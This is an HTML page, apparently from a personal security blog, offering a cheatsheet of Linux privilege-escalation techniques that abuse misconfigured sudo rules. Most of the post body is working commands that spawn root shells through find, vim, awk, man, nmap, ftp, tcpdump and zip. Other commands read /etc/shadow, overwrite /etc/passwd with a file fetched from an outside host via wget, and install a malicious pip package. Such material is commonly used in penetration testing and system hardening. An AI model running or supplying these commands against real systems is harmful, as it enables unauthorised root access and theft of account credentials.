@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sudoers,privilege_escalation,cheatsheet,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合. ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.">
+<meta name="keywords" content="sudoers,privilege_escalation,cheatsheet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="privilege escalate with sudoers">
+<meta property="og:url" content="https://exexute.github.io/2019/03/26/sudoers-get-root-cheatsheet/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合. ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2022-06-24T14:20:09.040Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="privilege escalate with sudoers">
+<meta name="twitter:description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合. ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/03/26/sudoers-get-root-cheatsheet/">
+
+
+
+
+
+  <title>privilege escalate with sudoers | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/03/26/sudoers-get-root-cheatsheet/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">privilege escalate with sudoers</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T13:09:49+08:00">
+                2019-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合.</p>
+<p>ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.<br><a id="more"></a></p>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>Whit is Sudo?</li>
+<li>sudo提权</li>
+</ul>
+<h2 id="What-is-Sudo"><a href="#What-is-Sudo" class="headerlink" title="What is Sudo?"></a>What is Sudo?</h2><p>Sudo( su “do” )是一款开源的软件, 运行于<code>*nix</code>系统上, sudo涉及授权账户和被授权账户, 授权账户下发权限到被授权账户上; 被授权账户使用该命令可使用授权权限运行对应的命令, 默认授权账户为root.</p>
+<p>sudo命令依赖于sudo配置, 配置常存储于<code>/etc/sudoers</code>或<code>ldap</code>中, 普通用户可通过<code>sudo -l</code>命令查看是否拥有sudo权限和对应的命令.</p>
+<p><code>sudo -l</code>的结果如下:<br>sudoers配置的内容包括: 命令、用户、用户组、密码四块内容, 本文仅展示最简单的几种:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无 sudo 权限</span></span><br><span class="line">对不起，用户 execute 不能在 archlinux 上运行 sudo。</span><br><span class="line"></span><br><span class="line"><span class="comment"># root的 sudo权限: sudo执行不需要密码, 且以root权限运行/bin/cat命令</span></span><br><span class="line">(root) NOPASSWD: /bin/cat</span><br><span class="line"><span class="comment"># 运行sudo命令</span></span><br><span class="line">$ sudo /bin/cat /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># storm的 sudo权限: sudo执行需要密码, 且以storm权限执行</span></span><br><span class="line">(storm) /bin/cat</span><br><span class="line"><span class="comment"># 运行sudo命令式需要添加-u指定用户</span></span><br><span class="line">$ sudo -u storm /bin/cat /etc/shadow</span><br></pre></td></tr></table></figure></p>
+<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>错误的配置<code>/etc/suduers</code>文件可导致提权, 此处记录可利用<code>sudoers</code>错误配置进行提权的命令.</p>
+<ul>
+<li>find</li>
+<li>nano</li>
+<li>vi/vim</li>
+<li>man</li>
+<li>awk</li>
+<li>less</li>
+<li>more</li>
+<li>wget</li>
+<li>apache2</li>
+<li>nmap</li>
+<li>ftp</li>
+<li>tcpdump</li>
+<li>pip</li>
+<li>zip</li>
+</ul>
+<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>成熟的利用方法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo find /etc/passwd -<span class="built_in">exec</span> /bin/bash \;</span><br></pre></td></tr></table></figure></p>
+<p>(find_escalate_root)[find.png]</p>
+<p>有些linux系统的find命令虽然设置了suid标志位却无法通过上述方法进行提权, 此时需要考虑用别的方法来进行提权, 如:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find /etc/shadow -<span class="built_in">exec</span> cat /etc/shadow \;</span><br></pre></td></tr></table></figure></p>
+<p>(with_suid_escalate_root)[find_suid.png]</p>
+<h4 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h4><p>nano修改文件导致提权的方法很多, 此处以修改<code>/etc/passwd</code>中当前用户的<code>uid</code>、<code>gid</code>值来实现提权.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用nano编辑/etc/passwd文件</span></span><br><span class="line">$ sudo nano /etc/passwd</span><br><span class="line"><span class="comment"># 修改当前账号的uid、gid均为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用su命令重新切换到当前账号, 即可进入root账号</span></span><br><span class="line">$ su execute</span><br></pre></td></tr></table></figure></p>
+<h4 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi/vim"></a>vi/vim</h4><p>vim运行bash命令提权<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -c: 加载第一个文件后执行 -c参数后的命令</span></span><br><span class="line">$ sudo vim -c <span class="string">"/bin/bash"</span></span><br></pre></td></tr></table></figure></p>
+<p><a href="with_vim_sudoers_escalate_root.png">with_vim_sudoers_escalate_root</a></p>
+<p>有些linux系统的vim设置SUID位后, 无法用上述方法进行提权, 此时可通过vim命令修改<code>/etc/sudoers</code>文件, 增加当前用户的sudo权限实现提权, 也可以通过修改<code>/etc/passwd</code>文件中当前用户的id实现提权.<br>1.编辑<code>/etc/passwd</code>文件<br><a href="with_suid_vim_escalate_root_1.png">with_suid_vim_escalate_root_1</a><br><a href="with_suid_vim_escalate_root_2.png">with_suid_vim_escalate_root_2</a><br><a href="with_suid_vim_escalate_root_3.png">with_suid_vim_escalate_root_3</a><br>2.重新登陆系统获取root权限<br><a href="with_suid_vim_escalate_root_4.png">with_suid_vim_escalate_root_4</a></p>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br></pre></td></tr></table></figure>
+<h4 id="less-more-man"><a href="#less-more-man" class="headerlink" title="less/more/man"></a>less/more/man</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入man帮助页</span></span><br><span class="line">$ sudo man man</span><br><span class="line"><span class="comment"># 直接按下:"!sh"或"!/bin/bash", 键入回车实现越权或绕过rbash</span></span><br></pre></td></tr></table></figure>
+<h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p>wget用于下载文件, 可指定保存文件位置, 设置了sudo权限的wget可通过覆盖文件实现提权, 此处以覆盖<code>/root/.ssh/</code>为例, 还可以覆盖<code>/etc/passwd</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载passwd文件覆盖/etc/passwd</span></span><br><span class="line">$ sudo wget http://172.16.88.130/passwd -O /etc/passwd</span><br><span class="line"><span class="comment"># 切换到passwd中的用户</span></span><br><span class="line">$ su hack</span><br></pre></td></tr></table></figure></p>
+<h4 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过apache2的命令行工具, 无法直接get shell或修改系统文件, 但可读取文件, 通过爆破密码登陆系统.</span></span><br><span class="line">$ sudo apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure>
+<h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>1.老版本的nmap具有交互式命令行, 可通过下面的命令提权<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[execute@archlinux ~]<span class="comment"># sudo nmap --interactive</span></span><br><span class="line">nmap&gt; !bash</span><br><span class="line">[root@archlinux ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>2.新版本的nmap无交互式命令行, 可通过nse脚本进行提权<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .nse后缀非必须选项</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"os.execute('/bin/bash')"</span> &gt; /tmp/pri.nse &amp;&amp; sudo nmap --script=/tmp/pri.nse</span><br></pre></td></tr></table></figure></p>
+<h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ftp</span><br><span class="line">ftp&gt; !/bin/bash</span><br></pre></td></tr></table></figure>
+<h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p>tcpdump用于网络抓包, 参数<code>-z</code>可指定抓包结束后执行的命令, <code>-Z</code>指定使用什么账户来执行(在4.0.0版本中被引入)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编写提权exp</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"(echo 'owefsad';sleep 2;echo 'owefsad')|passwd"</span>&gt;/tmp/.pri</span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line">$ chmod +x /tmp/.pri</span><br><span class="line"><span class="comment"># 抓包提权</span></span><br><span class="line">$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.pri -Z root</span><br></pre></td></tr></table></figure></p>
+<h4 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h4><p>pip是python安装模块的命令, python中安装模块时可执行操作系统命令, 因此通过构造提权的pip包即可提权.<br>大佬公开的git地址:<a href="https://github.com/0x00-0x00/FakePip" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir pri;<span class="built_in">cd</span> pri</span><br><span class="line">$ wget https://raw.githubusercontent.com/0x00-0x00/FakePip/master/setup.py</span><br><span class="line">$ sudo pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure></p>
+<h4 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h4><p>zip是从第4篇文章中看到的挑战, 经过翻阅zip说明文档后, 使用下面的简单方法进行提权, 但是zip还有很多有意思的提权, 请在第5篇文章中查看.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo zip -U /root/original-docs.zip -O /var/lib/extracted-docs.zip -T -TT <span class="string">'/bin/bash #'</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a href="https://www.sudo.ws/" target="_blank" rel="noopener">sudo官网介绍</a></li>
+<li><a href="https://www.sudo.ws/man/1.8.27/sudoers.man.html" target="_blank" rel="noopener">sudoers配置详解</a></li>
+<li><a href="https://www.securitynewspaper.com/2018/04/25/proper-use-sudo-linux-privilege-escalation/" target="_blank" rel="noopener">proper-use-sudo-linux-privilege-escalation</a></li>
+<li><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="noopener">how-i-got-root-with-sudo</a></li>
+<li><a href="https://www.securusglobal.com/community/2014/05/14/solutions-to-the-sudo-challenge/" target="_blank" rel="noopener">solutions-to-the-sudo-challenge</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sudoers/" rel="tag"># sudoers</a>
+          
+            <a href="/tags/privilege-escalation/" rel="tag"># privilege_escalation</a>
+          
+            <a href="/tags/cheatsheet/" rel="tag"># cheatsheet</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/26/linux-find-hacking/" rel="next" title="linux_find_hacking">
+                <i class="fa fa-chevron-left"></i> linux_find_hacking
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/27/privilege-escalate-with-SUID/" rel="prev" title="privilege escalate with SUID">
+                privilege escalate with SUID <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文章目录"><span class="nav-number">1.</span> <span class="nav-text">文章目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What-is-Sudo"><span class="nav-number">2.</span> <span class="nav-text">What is Sudo?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo提权"><span class="nav-number">3.</span> <span class="nav-text">sudo提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#find"><span class="nav-number">3.0.1.</span> <span class="nav-text">find</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nano"><span class="nav-number">3.0.2.</span> <span class="nav-text">nano</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vi-vim"><span class="nav-number">3.0.3.</span> <span class="nav-text">vi/vim</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#awk"><span class="nav-number">3.0.4.</span> <span class="nav-text">awk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-more-man"><span class="nav-number">3.0.5.</span> <span class="nav-text">less/more/man</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wget"><span class="nav-number">3.0.6.</span> <span class="nav-text">wget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#apache2"><span class="nav-number">3.0.7.</span> <span class="nav-text">apache2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">3.0.8.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ftp"><span class="nav-number">3.0.9.</span> <span class="nav-text">ftp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcpdump"><span class="nav-number">3.0.10.</span> <span class="nav-text">tcpdump</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pip"><span class="nav-number">3.0.11.</span> <span class="nav-text">pip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip"><span class="nav-number">3.0.12.</span> <span class="nav-text">zip</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
